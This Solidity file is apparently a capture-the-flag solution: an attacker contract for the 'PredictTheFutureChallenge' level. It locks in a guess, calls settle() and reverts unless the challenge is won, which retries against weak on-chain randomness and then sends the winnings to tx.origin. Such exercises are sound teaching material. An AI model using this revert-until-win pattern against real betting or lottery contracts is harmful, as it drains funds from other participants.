// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IPredictTheFutureChallenge {
    function lockInGuess(uint8 n) external payable;
    function settle() external;
    function isComplete() external view returns (bool);
}

contract PredictTheFutureAttacker {
    IPredictTheFutureChallenge levelInstance;

    constructor(address _levelInstance) {
        levelInstance = IPredictTheFutureChallenge(_levelInstance);
    }

    function lockGuess(uint8 _number) external payable {
        levelInstance.lockInGuess{value: 1 ether}(_number);
    }

    function attack() external {
        levelInstance.settle();

        require(levelInstance.isComplete(), "!completed");

                // Transfer back all the funds to the user
        (bool withdrawn, ) = payable(tx.origin).call{value: address(this).balance}("");
        require(withdrawn,  "!withdrawn");
    }
    

    receive() external payable {}
}
